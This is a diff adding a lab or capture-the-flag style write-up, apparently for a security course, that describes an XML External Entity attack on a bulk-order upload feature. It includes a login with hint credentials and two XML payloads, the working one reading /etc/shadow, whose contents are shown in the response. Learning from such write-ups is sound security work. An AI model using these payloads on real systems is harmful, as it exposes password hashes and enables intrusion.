@@ -275,3 +275,75 @@ Continued this pattern, testing 0-9 and space for each position until no match f
 ## First Four Characters of Mallory's Credit Card
 
 **2034**
+
+# 4 SCHOGGI: XML External Entity (XXE) Solution
+
+## Attack Steps Description
+
+### Step 1: Preparation
+- Logged in with credentials `alice/alice.123` (from hints)
+- Navigated to **BULK ORDER** functionality
+- Downloaded the sample XML file to understand the structure
+- Analyzed the XML format used by the application
+
+### Step 2: Understanding the XML Structure
+The base XML structure looks like:
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<order>
+    <product>
+        <name>Product Name</name>
+        <quantity>25</quantity>
+    </product>
+</order>
+```
+
+### Step 3: Crafting the XXE Payload
+Modified the XML file to include an External Entity declaration that reads `/etc/shadow`:
+
+**Initial attempt with path traversal:**
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE query [ <!ENTITY attack SYSTEM "file://localhost/../../../../../../../../etc/shadow"> ]>
+<order>
+    <product>
+        <name>&attack;</name>
+        <quantity>25</quantity>
+    </product>
+    <product>
+        <name>Chococcasion</name>
+        <quantity>12</quantity>
+    </product>
+</order>
+```
+
+### Step 4: Finding the Correct Path
+
+- Uploaded the initial payload
+- Received error: `file missing` - which confirms XXE vulnerability exists
+- Adjusted the path by removing excessive traversal sequences
+
+**Working payload:**
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE query [ <!ENTITY attack SYSTEM "file:///etc/shadow"> ]>
+<order>
+    <product>
+        <name>&attack;</name>
+        <quantity>25</quantity>
+    </product>
+    <product>
+        <name>Chococcasion</name>
+        <quantity>12</quantity>
+    </product>
+</order>
+```
+
+
+### Step 5: Successful Exploitation
+
+- Uploaded the corrected XML file through the Bulk Order interface
+- The application processed the XML and resolved the external entity
+- The content of /etc/shadow was displayed in the response where the product name appears
+
+<img width="1728" height="970" alt="Screenshot 2025-10-07 at 22 03 35" src="https://github.com/user-attachments/assets/944469ad-499f-42ac-b594-c424bfa1ef6c" />
